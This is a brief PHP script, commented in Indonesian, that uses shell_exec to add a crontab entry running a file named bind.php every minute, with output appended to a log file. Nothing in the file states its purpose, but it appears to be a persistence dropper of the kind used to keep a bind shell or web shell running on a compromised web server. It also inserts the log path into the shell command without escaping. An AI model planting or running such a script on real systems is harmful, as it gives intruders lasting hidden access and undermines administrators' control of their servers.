<?php
// Direktori tempat skrip PHP ini diakses
$currentDirectory = dirname(__FILE__);

// Nama file log untuk menyimpan catatan
$logFile = $currentDirectory . '/log.txt';

// Tugas Cron untuk menjalankan perintah setiap menit dan log output
$customCronCommand = '* * * * * /usr/local/bin/php ' . escapeshellarg($currentDirectory . '/bind.php') . ' >> ' . $logFile . ' 2>&1';

// Tambahkan tugas Cron yang baru
$result = shell_exec('(crontab -l ; echo "'.$customCronCommand.'") | crontab -');

if ($result === false) {
    echo 'Gagal menambahkan tugas Cron.';
} else {
    echo 'Tugas Cron berhasil ditambahkan.';
}
?>
